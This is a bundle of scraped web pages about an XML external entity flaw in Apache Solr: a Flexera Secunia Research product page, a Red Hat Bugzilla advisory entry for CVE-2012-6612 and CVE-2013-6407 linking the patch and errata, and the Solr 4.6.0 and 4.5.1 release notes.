      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from bugzilla.redhat.com_adb16360_20250126_100336.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1035981)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1035981)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1035981)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1035981

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1035981**](show_bug.cgi?id=1035981)
(CVE-2012-6612, CVE-2013-6407)
- [CVE-2012-6612](https://access.redhat.com/security/cve/CVE-2012-6612) [CVE-2013-6407](https://access.redhat.com/security/cve/CVE-2013-6407) Apache Solr: XML eXternal Entity (XXE) flaw in XML and XSLT UpdateRequestHandler

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2012-6612 CVE-2013-6407 Apache Solr: XML eXternal Entity (XXE) flaw in XM...

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2012-6612, CVE-2013-6407 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1035993](show_bug.cgi?id=1035993) [1035994](show_bug.cgi?id=1035994) [1043748](show_bug.cgi?id=1043748) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [991853](show_bug.cgi?id=991853) [1035063](show_bug.cgi?id=1035063) | | TreeView+ | [depends on](buglist.cgi?bug_id=1035981&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1035981&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2013-11-29 06:11 UTC by David Jorm | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2019-09-29 13:10 UTC ([History](show_activity.cgi?id=1035981)) | | [CC List:](page.cgi?id=fields.html#cclist) | 5 users (show)  jdg-bugs jpallich mjc myarboro ttarrant | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2014-01-15 18:29:12 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2013:1844](https://access.redhat.com/errata/RHSA-2013%3A1844) | 0 | normal | SHIPPED\_LIVE | Important: Red Hat JBoss Web Framework Kit 2.4.0 update | 2013-12-16 23:21:40 UTC | | Red Hat Product Errata | [RHSA-2014:0029](https://access.redhat.com/errata/RHSA-2014%3A0029) | 0 | normal | SHIPPED\_LIVE | Important: Red Hat JBoss Data Grid 6.2.0 update | 2014-01-15 22:45:50 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1035981#c0)  David Jorm    2013-11-29 06:11:44 UTC  ``` It was found that the XML and XSLT UpdateRequestHandler classes in Apache Solr would resolve external entities, permitting XXE attacks. A remote attacker could use this flaw to read files accessible to the user running the application server, and potentially perform other more advanced XXE attacks.   ```  [Comment 2](show_bug.cgi?id=1035981#c2)  David Jorm    2013-11-29 07:08:58 UTC  ``` Upstream Bug:  <https://issues.apache.org/jira/browse/SOLR-3895>  Upstream Patch:  <https://issues.apache.org/jira/secure/attachment/12546766/SOLR-3895%2B3614.patch>   ```  [Comment 3](show_bug.cgi?id=1035981#c3)  errata-xmlrpc    2013-12-16 18:23:21 UTC  ``` This issue has been addressed in following products:    Red Hat JBoss Web Framework Kit 2.4.0  Via RHSA-2013:1844 <https://rhn.redhat.com/errata/RHSA-2013-1844.html>   ```  [Comment 4](show_bug.cgi?id=1035981#c4)  errata-xmlrpc    2014-01-15 17:46:53 UTC  ``` This issue has been addressed in following products:    Red Hat JBoss Data Grid 6.2.0  Via RHSA-2014:0029 <https://rhn.redhat.com/errata/RHSA-2014-0029.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1035981&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from lucene.apache.org_7bb207ac_20250125_155131.html ===

# Apache Solr Release Notes

## Introduction

Apache Solr is an open source enterprise search server based on the Apache Lucene Java
search library, with XML/HTTP and JSON APIs, hit highlighting, faceted search,
caching, replication, and a web administration interface. It runs in a Java
servlet container such as Jetty.

See <http://lucene.apache.org/solr> for more information.

## Getting Started

You need a Java 1.6 VM or later installed.
In this release, there is an example Solr server including a bundled
servlet container in the directory named "example".
See the tutorial at <http://lucene.apache.org/solr/tutorial.html>

## Release 4.6.0 [2013-11-24]

* Versions of Major Components   (5)
  1. Apache Tika 1.4
  2. Carrot2 3.8.0
  3. Velocity 1.7 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.4.5
* Upgrading from Solr 4.5.0   (1)
  1. If you are using methods from FieldMutatingUpdateProcessorFactory for getting
     configuration information (oneOrMany or getBooleanArg), those methods have
     been moved to NamedList and renamed to removeConfigArgs and removeBooleanArg,
     respectively. The original methods are deprecated, to be removed in 5.0.
     See [SOLR-5264](http://issues.apache.org/jira/browse/SOLR-5264).
### Detailed Change List

* New Features   (17)
  1. [SOLR-5167](http://issues.apache.org/jira/browse/SOLR-5167): Add support for AnalyzingInfixSuggester (AnalyzingInfixLookupFactory).

     (Areek Zillur, Varun Thacker via Robert Muir)
  2. [SOLR-5246](http://issues.apache.org/jira/browse/SOLR-5246): Shard splitting now supports collections configured with router.field.

     (shalin)
  3. [SOLR-5274](http://issues.apache.org/jira/browse/SOLR-5274): Allow JettySolrRunner SSL config to be specified via a constructor.

     (Mark Miller)
  4. [SOLR-5300](http://issues.apache.org/jira/browse/SOLR-5300): Shards can be split by specifying arbitrary number of hash ranges
     within the shard's hash range.

     (shalin)
  5. [SOLR-5226](http://issues.apache.org/jira/browse/SOLR-5226): Add Lucene index heap usage to the Solr admin UI.

     (Areek Zillur via Robert Muir)
  6. [SOLR-5324](http://issues.apache.org/jira/browse/SOLR-5324): Make sub shard replica recovery and shard state switch asynchronous.

     (Yago Riveiro, shalin)
  7. [SOLR-5338](http://issues.apache.org/jira/browse/SOLR-5338): Split shards by a route key using split.key parameter.

     (shalin)
  8. [SOLR-5353](http://issues.apache.org/jira/browse/SOLR-5353): Enhance CoreAdmin api to split a route key's documents from an index
     and leave behind all other documents.

     (shalin)
  9. [SOLR-5027](http://issues.apache.org/jira/browse/SOLR-5027): CollapsingQParserPlugin for high performance field collapsing on high cardinality fields.

     (Joel Bernstein)
  10. [SOLR-5395](http://issues.apache.org/jira/browse/SOLR-5395): Added a RunAlways marker interface for UpdateRequestProcessorFactory
      implementations indicating that they should not be removed in later stages
      of distributed updates (usually signalled by the update.distrib parameter)

      (yonik)
  11. [SOLR-5310](http://issues.apache.org/jira/browse/SOLR-5310): Add a collection admin command to remove a replica

      (noble)
  12. [SOLR-5311](http://issues.apache.org/jira/browse/SOLR-5311): Avoid registering replicas which are removed

      (noble)
  13. [SOLR-5406](http://issues.apache.org/jira/browse/SOLR-5406): CloudSolrServer failed to propagate request parameters
      along with delete updates.

      (yonik)
  14. [SOLR-5374](http://issues.apache.org/jira/browse/SOLR-5374): Support user configured doc-centric versioning rules
      via the optional DocBasedVersionConstraintsProcessorFactory
      update processor

      (Hossman, yonik)
  15. [SOLR-5392](http://issues.apache.org/jira/browse/SOLR-5392): Extend solrj apis to cover collection management.

      (Roman Shaposhnik via Mark Miller)
  16. [SOLR-5084](http://issues.apache.org/jira/browse/SOLR-5084): new field type EnumField.

      (Elran Dvir via Erick Erickson)
  17. [SOLR-5464](http://issues.apache.org/jira/browse/SOLR-5464): Add option to ConcurrentSolrServer to stream pure delete
      requests.

      (Mark Miller)
* Bug Fixes   (14)
  1. [SOLR-5216](http://issues.apache.org/jira/browse/SOLR-5216): Document updates to SolrCloud can cause a distributed deadlock.

     (Mark Miller)
  2. [SOLR-5367](http://issues.apache.org/jira/browse/SOLR-5367): Unmarshalling delete by id commands with JavaBin can lead to class cast
     exception.

     (Mark Miller)
  3. [SOLR-5359](http://issues.apache.org/jira/browse/SOLR-5359): ZooKeeper client is not closed when it fails to connect to an ensemble.

     (Mark Miller, Klaus Herrmann)
  4. [SOLR-5042](http://issues.apache.org/jira/browse/SOLR-5042): MoreLikeThisComponent was using the rows/count value in place of
     flags, which caused a number of very strange issues, including NPEs and
     ignoring requests for the results to include the score.

     (Anshum Gupta, Mark Miller, Shawn Heisey)
  5. [SOLR-5371](http://issues.apache.org/jira/browse/SOLR-5371): Solr should consistently call SolrServer#shutdown

     (Mark Miller)
  6. [SOLR-5363](http://issues.apache.org/jira/browse/SOLR-5363): Solr doesn't start up properly with Log4J2

     (Petar Tahchiev via Alan
     Woodward)
  7. [SOLR-5380](http://issues.apache.org/jira/browse/SOLR-5380): Using cloudSolrServer.setDefaultCollection(collectionId) does not
     work as intended for an alias spanning more than 1 collection.

     (Thomas Egense, Shawn Heisey, Mark Miller)
  8. [SOLR-5418](http://issues.apache.org/jira/browse/SOLR-5418): Background merge after field removed from solr.xml causes error.

     (Reported on user's list, Robert M's patch via Erick Erickson)
  9. [SOLR-5318](http://issues.apache.org/jira/browse/SOLR-5318): Creating a core via the admin API doesn't respect transient property

     (Olivier Soyez via Erick Erickson)
  10. [SOLR-5388](http://issues.apache.org/jira/browse/SOLR-5388): Creating a new core via the HTTP API that results in a transient being
      unloaded results in a " Too many close [count:-1]" error.

      (Olivier Soyez via Erick Erickson)
  11. [SOLR-5453](http://issues.apache.org/jira/browse/SOLR-5453): Raise recovery socket read timeouts.

      (Mark Miller)
  12. [SOLR-5397](http://issues.apache.org/jira/browse/SOLR-5397): Replication can fail silently in some cases.

      (Mark Miller)
  13. [SOLR-5465](http://issues.apache.org/jira/browse/SOLR-5465): SolrCmdDistributor retry logic has a concurrency race bug.

      (Mark Miller)
  14. [SOLR-5452](http://issues.apache.org/jira/browse/SOLR-5452): Do not attempt to proxy internal update requests.

      (Mark Miller)
* Optimizations   (4)
  1. [SOLR-5232](http://issues.apache.org/jira/browse/SOLR-5232): SolrCloud should distribute updates via streaming rather than buffering.

     (Mark Miller)
  2. [SOLR-5223](http://issues.apache.org/jira/browse/SOLR-5223): SolrCloud should use the JavaBin binary format for communication by default.

     (Mark Miller)
  3. [SOLR-5370](http://issues.apache.org/jira/browse/SOLR-5370): Requests to recover when an update fails should be done in
     background threads.

     (Mark Miller)
  4. [LUCENE-5300](http://issues.apache.org/jira/browse/LUCENE-5300),[LUCENE-5304](http://issues.apache.org/jira/browse/LUCENE-5304): Specialized faceting for fields which are declared as
     multi-valued in the schema but are actually single-valued.

     (Adrien Grand)
* Security   (1)
  1. [SOLR-4882](http://issues.apache.org/jira/browse/SOLR-4882): SolrResourceLoader was restricted to only allow access to resource
     files below the instance dir. The reason for this is security related: Some
     Solr components allow to pass in resource paths via REST parameters
     (e.g. XSL stylesheets, velocity templates,...) and load them via resource
     loader. For backwards compatibility, this security feature can be disabled
     by a new system property: solr.allow.unsafe.resourceloading=true

     (Uwe Schindler)
* Other Changes   (8)
  1. [SOLR-5237](http://issues.apache.org/jira/browse/SOLR-5237): Add indexHeapUsageBytes to LukeRequestHandler, indicating how much
     heap memory is being used by the underlying Lucene index structures.

     (Areek Zillur via Robert Muir)
  2. [SOLR-5241](http://issues.apache.org/jira/browse/SOLR-5241): Fix SimplePostToolTest performance problem - implicit DNS lookups

     (hossman)
  3. [SOLR-5273](http://issues.apache.org/jira/browse/SOLR-5273): Update HttpComponents to 4.2.5 and 4.2.6.

     (Mark Miller)
  4. [SOLR-5264](http://issues.apache.org/jira/browse/SOLR-5264): Move methods for getting config information from
     FieldMutatingUpdateProcessorFactory to NamedList.

     (Shawn Heisey)
  5. [SOLR-5319](http://issues.apache.org/jira/browse/SOLR-5319): Remove unused and incorrect router name from Collection ZK nodes.

     (Jessica Cheng via shalin)
  6. [SOLR-5321](http://issues.apache.org/jira/browse/SOLR-5321): Remove unnecessary code in Overseer.updateState method which tries to
     use router name from message where none is ever sent.

     (shalin)
  7. [SOLR-5401](http://issues.apache.org/jira/browse/SOLR-5401): SolrResourceLoader logs a warning if a deprecated (factory) class
     is used in schema or config.

     (Uwe Schindler)
  8. [SOLR-3397](http://issues.apache.org/jira/browse/SOLR-3397): Warn if master or slave replication is enabled in SolrCloud mode.

     (Erick
     Erickson)

## Release 4.5.1 [2013-10-24]

* Versions of Major Components   (5)
  1. Apache Tika 1.4
  2. Carrot2 3.8.0
  3. Velocity 1.7 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.4.5
### Detailed Change List

* Bug Fixes   (16)
  1. [SOLR-4590](http://issues.apache.org/jira/browse/SOLR-4590): Collections API should return a nice error when not in SolrCloud mode.

     (Anshum Gupta, Mark Miller)
  2. [SOLR-5295](http://issues.apache.org/jira/browse/SOLR-5295): The CREATESHARD collection API creates maxShardsPerNode number of
     replicas if replicationFactor is not specified.

     (Brett Hoerner, shalin)
  3. [SOLR-5296](http://issues.apache.org/jira/browse/SOLR-5296): Creating a collection with implicit router adds shard ranges
     to each shard.

     (shalin)
  4. [SOLR-5263](http://issues.apache.org/jira/browse/SOLR-5263): Fix CloudSolrServer URL cache update race.

     (Jessica Cheng, Mark Miller)
  5. [SOLR-5297](http://issues.apache.org/jira/browse/SOLR-5297): Admin UI - Threads Screen missing Icon

     (steffkes)
